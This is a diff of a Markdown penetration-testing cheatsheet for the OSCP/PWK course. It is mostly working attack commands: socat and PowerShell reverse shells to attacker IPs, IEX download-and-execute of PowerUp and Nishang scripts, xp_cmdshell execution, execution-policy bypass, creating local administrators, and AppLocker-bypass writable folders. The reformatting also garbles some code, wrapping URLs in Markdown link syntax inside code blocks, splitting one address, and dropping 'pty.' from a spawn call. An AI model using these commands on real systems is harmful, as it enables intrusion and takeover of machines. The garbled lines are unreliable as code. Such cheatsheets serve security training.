+1.  `python -c 'import pty;spawn("/bin/bash");'` OR `python3 -c 'import pty;spawn("/bin/bash");'`
+2.  In reverse shell:
 
-#### Python
+<!-- end list -->
 
-1. python -c 'import pty;spawn("/bin/bash");'
-   or
-1. python3 -c 'import pty;spawn("/bin/bash");'
-1. In reverse shell:
-
-```
+```bash
 python -c 'import pty; pty.spawn("/bin/bash")'
 Ctrl-Z
-
-- In Kali
-
-3. stty raw -echo
-4. fg
-
-- In reverse shell
-5. reset (sometimes optional)
-6. export SHELL=bash
-7. export TERM=xterm-256color
-8. stty rows <num> columns <cols> (optional)
-(Sometimes the command will need to be executed: export TERM=xterm)
 ```
 
-Using socat
+3.  In Kali:
 
+<!-- end list -->
+
+```bash
+stty raw -echo
+fg
 ```
-#Listener:
+
+4.  In reverse shell:
+
+<!-- end list -->
+
+```bash
+reset # (sometimes optional)
+export SHELL=bash
+export TERM=xterm-256color
+stty rows <num> columns <cols> # (optional)
+```
+
+### Using Socat
+
+**Listener:**
+
+```bash
 socat file:`tty`,raw,echo=0 tcp-listen:4444
-#Victim:
+```
+
+**Victim:**
+
+```bash
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 ```
 
-#### Perl
+### Perl
 
-1. perl -e 'exec "/bin/sh";'
-2. perl: exec "/bin/sh";
+1.  `perl -e 'exec "/bin/sh";'`
+2.  `perl: exec "/bin/sh";`
 
-#### Bash
+### Bash
 
-/bin/sh -i
+`/bin/sh -i`
+
+## SQL Injection (SQLmap)
+
+```bash
+sqlmap -u "[http://example.com/test.php?test=test](http://example.com/test.php?test=test)" --level=5 --risk=3 --batch
+```
 
 ## Show listening ports
 
--   Linux netstat syntax
+**Linux netstat:**
+`netstat -tulpn | grep LISTEN`
 
-    1.  netstat -tulpn | grep LISTEN
+**FreeBSD/MacOS X netstat:**
+`netstat -anp tcp | grep LISTEN`
+`netstat -anp udp | grep LISTEN`
 
--   FreeBSD/MacOS X netstat syntax
-    1.  netstat -anp tcp | grep LISTEN
-    2.  netstat -anp udp | grep LISTEN
--   OpenBSD netstat syntax
+**OpenBSD netstat:**
+`netstat -na -f inet | grep LISTEN`
+`netstat -nat | grep LISTEN`
 
-    1.  netstat -na -f inet | grep LISTEN
-    2.  netstat -nat | grep LISTEN
-
--   Nmap scan syntax
-    1.  sudo nmap -sT -O localhost
-    2.  sudo nmap -sU -O 192.168.2.13 ##[ list open UDP ports ]##
-    3.  sudo nmap -sT -O 192.168.2.13 ##[ list open TCP ports ]##
+**Nmap scan:**
+`sudo nmap -sT -O localhost`
+`sudo nmap -sU -O 192.168.2.13` (UDP)
+`sudo nmap -sT -O 192.168.2.13` (TCP)
 
 ## SMB - Enumeration
 
--   https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html
--   smbmap -H 10.10.10.10
--   smbclient -L 10.0.0.10
--   smbclient //10.10.10.10/share$
+  - [0xdf - SMB Enumeration Checklist](https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html)
+  - `smbmap -H 10.10.10.10`
+  - `smbclient -L 10.0.0.10`
+  - `smbclient //10.10.10.10/share$`
 
 ## SMB - Impacket
 
--   Impacket's PSEXEC (After creating a remote port fwd)
-    /usr/share/doc/python-impacket/examples/psexec.py user@10.10.10.10
+**Impacket's PSEXEC** (After creating a remote port fwd):
 
-Password: (password)
+```bash
+/usr/share/doc/python-impacket/examples/psexec.py user@10.10.10.10
+# Password: (password)
+# [*] Trying protocol 445/SMB...
+```
 
-[*] Trying protocol 445/SMB...
+**Impacket's SMBServer** (For File Transfer):
 
--   Impacket's SMBServer (For File Transfer)
-
-1. cd /usr/share/windows-binaries
-2. python /usr/share/doc/python-impacket/examples/smbserver.py a .
-3. \\\10.10.10.10\a\mimikatz.exe
+1.  `cd /usr/share/windows-binaries`
+2.  `python /usr/share/doc/python-impacket/examples/smbserver.py a .`
+3.  `\\10.10.10.10\a\mimikatz.exe`
 
 ## SMTP Enumeration
 
-https://github.com/s0wr0b1ndef/OSCP-note/blob/master/ENUMERATION/SMTP/smtp_commands.txt
+  - [SMTP Commands](https://github.com/s0wr0b1ndef/OSCP-note/blob/master/ENUMERATION/SMTP/smtp_commands.txt)
 
 ## ICMP Injection
 
-1. ping -n 3 10.10.10.10
-2. tcpdump -i tun0 icmp
+1.  `ping -n 3 10.10.10.10`
+2.  `tcpdump -i tun0 icmp`
 
 ## VMware (not going full screen)
 
 `systemctl restart open-vm-tools.service`
 
-## Web Servers:
+## Web Servers
 
--   python -m SimpleHTTPServer 80
--   python3 -m http.server 80
--   ngrok http "file:///C:\Users\sinfulz\Public Folder"
--   php -S 0.0.0.0:80
+  - `python -m SimpleHTTPServer 80`
+  - `python3 -m http.server 80`
+  - `ngrok http "file:///C:\Users\sinfulz\Public Folder"`
+  - `php -S 0.0.0.0:80`
 
-## Web Scanning:
+## Web Scanning
 
-Web Scanning with extensions
+**GoBuster (Linux/Apache):**
 
-Linux (Example web server might be Apache)
-`gobuster dir -e -u http://10.10.10.10/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,js,txt,jsp,pl -s 200,204,301,302,307,403,401`
+```bash
+gobuster dir -e -u [http://10.10.10.10/](http://10.10.10.10/) -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,js,txt,jsp,pl -s 200,204,301,302,307,403,401
+```
 
-Windows (Example web server might be IIS)
+**GoBuster (Windows/IIS):**
 
-`gobuster dir -e -u http://10.10.10.10/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,js,txt,asp,aspx,jsp,bak -s 200,204,301,302,307,403,401`
+```bash
+gobuster dir -e -u [http://10.10.10.10/](http://10.10.10.10/) -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,js,txt,asp,aspx,jsp,bak -s 200,204,301,302,307,403,401
+```
 
-Linux (Example web server might be Apache)
+**Dirsearch (Linux/Apache):**
 
-`python3 dirsearch.py -r -u http://10.10.10.131/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php,html,js,txt,jsp,pl -t 50`
+```bash
+python3 dirsearch.py -r -u [http://10.10.10.131/](http://10.10.10.131/) -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php,html,js,txt,jsp,pl -t 50
+```
 
-Windows (Example web server might be IIS)
+**Dirsearch (Windows/IIS):**
 
-`python3 dirsearch.py -r -u http://10.10.10.131/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php,html,js,txt,asp,aspx,jsp,bak -t 50`
+```bash
+python3 dirsearch.py -r -u [http://10.10.10.131/](http://10.10.10.131/) -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php,html,js,txt,asp,aspx,jsp,bak -t 50
+```
 
-HTTP
-`gobuster dir -u http://10.10.10.10 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,html,txt -t 69`
+**Other GoBuster:**
 
-HTTPS
-`gobuster dir -k -u https://10.10.10.10/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 69`
-(in some cases --wildcard will need to be used instead of -k)
+  - HTTP: `gobuster dir -u http://10.10.10.10 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,html,txt -t 69`
+  - HTTPS: `gobuster dir -k -u https://10.10.10.10/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 69`
 
-Nikto
-`nikto -h 10.10.10.10 -p 80`
+**Nikto:**
 
-Nikto HTTPS
-``nikto -h 10.10.10.10 -p 443```
+  - HTTP: `nikto -h 10.10.10.10 -p 80`
+  - HTTPS: `nikto -h 10.10.10.10 -p 443`
 
-WFuzz
-`wfuzz -u http://10.10.10.10/hello.php?dir=../../../../../../../../../FUZZ%00 -w /usr/share/wfuzz/wordlist/general/common.txt`
+**WFuzz:**
+
+```bash
+wfuzz -u [http://10.10.10.10/hello.php?dir=../../../../../../../../../FUZZ%00](http://10.10.10.10/hello.php?dir=../../../../../../../../../FUZZ%00) -w /usr/share/wfuzz/wordlist/general/common.txt
+```
 
 ## Web Shells
 
--   https://github.com/Arrexel/phpbash
--   https://github.com/flozz/p0wny-shell
+  - [PHPBash](https://github.com/Arrexel/phpbash)
+  - [p0wny-shell](https://github.com/flozz/p0wny-shell)
 
 ## WordPress
 
--   https://forum.top-hat-sec.com/index.php?topic=5758.0
+  - [Top Hat Sec - WP](https://forum.top-hat-sec.com/index.php?topic=5758.0)
 
 ## Windows Framework / Powershell
 
-bypass PowerShell execution policy
+**Bypass PowerShell execution policy:**
 
--   Bypassing execution policy and executing a script:
-    `powershell -ExecutionPolicy ByPass -File script.ps1`
-
----
-
--   https://github.com/samratashok/nishang
--   https://github.com/rasta-mouse/Sherlock
--   Reverse Powershell: (sometimes powershell or echo may need to be infront of the string and sometimes quotes may be needed, e.g. powershell IEX or powershell "IEX..etc" or echo IEX).
-
+```powershell
+powershell -ExecutionPolicy ByPass -File script.ps1
 ```
+
+**Resources:**
+
+  - [Nishang](https://github.com/samratashok/nishang)
+  - [Sherlock](https://github.com/rasta-mouse/Sherlock)
+
+**Reverse PowerShell:**
+(Sometimes powershell or echo may need to be in front of the string, or quotes used).
+
+```powershell
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.1.3.40',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
 
--   If one has a Command Prompt shell, this will grab PowerUp from a local web server and run it on the compromised shell:
+**PowerUp (from local web server):**
 
-```
-echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10:80/PowerUp.ps1') | powershell -noprofile -
-```
-
-```
-IEX(New-object Net.WebClient).DownloadString('http://10.10.10.10:80/PowerUp.ps1')
-
+```powershell
+echo IEX(New-Object Net.WebClient).DownloadString('[http://10.10.10.10:80/PowerUp.ps1](http://10.10.10.10:80/PowerUp.ps1)') | powershell -noprofile -
 ```
 
-```
-powershell -nop -exec bypass IEX "(New-Object Net.WebClient).DownloadString('http://10.10.14.x/Whatever.ps1'); Invoke-Whatever"
+or
+
+```powershell
+powershell -nop -exec bypass IEX "(New-Object Net.WebClient).DownloadString('[http://10.10.14.](http://10.10.14.)x/Whatever.ps1'); Invoke-Whatever"
 ```
 
--   Reverse Powershell using mssql:
+**Reverse PowerShell using MSSQL:**
 
-```
-xp_cmdshell powershell IEX(New-Object Net.WebClient).downloadstring(\"http://10.10.10.10/Nishang-ReverseShell.ps1\")
+```sql
+xp_cmdshell powershell IEX(New-Object Net.WebClient).downloadstring(\"[http://10.10.10.10/Nishang-ReverseShell.ps1](http://10.10.10.10/Nishang-ReverseShell.ps1)\")
 ```
 
--   File transfer with PowerShell:
+**File transfer with PowerShell:**
 
-```
-powershell -c IEX(New-Object Net.WebClient).DownloadFile('http://server/path/to/file', 'nameforefile')`
+```powershell
+powershell -c IEX(New-Object Net.WebClient).DownloadFile('http://server/path/to/file', 'nameforefile')
 ```
 
 ## Windows Post Exploitation Commands
 
--   WMIC USERACCOUNT LIST BRIEF
--   net user
--   net localgroup Users
--   net localgroup Administrators
--   net user USERNAME NEWPASS /add
--   net user "USER NAME" NEWPASS /add
--   net localgroup administrators USERNAME /add
+```cmd
+WMIC USERACCOUNT LIST BRIEF
+net user
+net localgroup Users
+net localgroup Administrators
+net user USERNAME NEWPASS /add
+net user "USER NAME" NEWPASS /add
+net localgroup administrators USERNAME /add
+```
 
-Writeable Directories
+## Writeable Directories
 
-# Windows
+### Windows
 
----
-
-list from https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md
-The following folders are by default writable by normal users (depends on Windows version - This is from W10 1803)
+(Source: [UltimateAppLockerByPassList](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md))
+The following folders are by default writable by normal users (varies by OS version).
 
 ```
 C:\Windows\Tasks
@@ -696,38 +790,43 @@ C:\Windows\System32\spool\PRINTERS
 C:\Windows\System32\spool\SERVERS
 C:\Windows\System32\spool\drivers\color
 C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter
-C:\Windows\System32\Tasks_Migrated (after peforming a version upgrade of Windows 10)
+C:\Windows\System32\Tasks_Migrated
 C:\Windows\SysWOW64\FxsTmp
 C:\Windows\SysWOW64\com\dmp
 C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter
 C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
 ```
 
-# Linux
+### Linux
 
-To find World Writeable Directories in Linux use the command:
-`find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print`
+To find World Writeable Directories in Linux:
+
+```bash
+find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print
+```
+
+-----
 
 ## Todo List:
 
--   Improve the readability of the cheatsheet
--   Fill in the empty sections
--   Remove unnecessary sections
--   Integrate the files in the repo into the cheatsheet
--   Migrate to GitBook
--   Include screenshots/gifs into the cheatsheet if needed
--   Add a Table of Contents similar to PayloadAllTheThings' repos
+  - [ ] Improve the readability of the cheatsheet
+  - [ ] Fill in the empty sections
+  - [ ] Remove unnecessary sections
+  - [ ] Integrate the files in the repo into the cheatsheet
+  - [ ] Migrate to GitBook
+  - [ ] Include screenshots/gifs into the cheatsheet if needed
+  - [ ] Add a Table of Contents
 
 ## Thank you:
 
-# Thanks to these people for including my cheatsheet on their website/blog:
+Thanks to these people for including my cheatsheet on their website/blog:
 
--   https://khaoticdev.net/cheatsheets/#collections
--   https://www.facebook.com/ncybersec/posts/1541830509321001
--   https://www.facebook.com/cyberg0100/posts/github-sinfulzjusttryharder-justtryharder-a-cheat-sheet-which-will-aid-you-throu/653235345249466
--   https://www.reddit.com/r/CyberSpaceVN/comments/f3n2wp/github_sinfulzjusttryharder_justtryharder_a_cheat
--   https://xn4k.github.io/pentest/PWK-course-&-the-OSCP-Exam-Cheatsheet/
--   https://opensourcelibs.com/libs/pentesting-tools
--   https://gitmemory.com/brhannah
--   https://www.bugbountytips.tech/2020/08/23/justtryharderpwk-cheatsheetkali-linux-cheatsheethydra-cheatsheetsecu-2/
--   https://pythonlang.dev/category/oscp/
+- [KhaoticDev Cheatsheets](https://khaoticdev.net/cheatsheets/#collections)
+- [NCyberSec Facebook Post](https://www.facebook.com/ncybersec/posts/1541830509321001)
+- [CyberG0100 Facebook Post](https://www.facebook.com/cyberg0100/posts/github-sinfulzjusttryharder-justtryharder-a-cheat-sheet-which-will-aid-you-throu/653235345249466)
+- [r/CyberSpaceVN Reddit Post](https://www.reddit.com/r/CyberSpaceVN/comments/f3n2wp/github_sinfulzjusttryharder_justtryharder_a_cheat)
+- [XN4K PWK Cheatsheet](https://xn4k.github.io/pentest/PWK-course-&-the-OSCP-Exam-Cheatsheet/)
+- [OpenSourceLibs Pentesting Tools](https://opensourcelibs.com/libs/pentesting-tools)
+- [GitMemory (brhannah)](https://gitmemory.com/brhannah)
+- [BugBountyTips Blog](https://www.bugbountytips.tech/2020/08/23/justtryharderpwk-cheatsheetkali-linux-cheatsheethydra-cheatsheetsecu-2/)
+- [PythonLang OSCP Category](https://pythonlang.dev/category/oscp/)
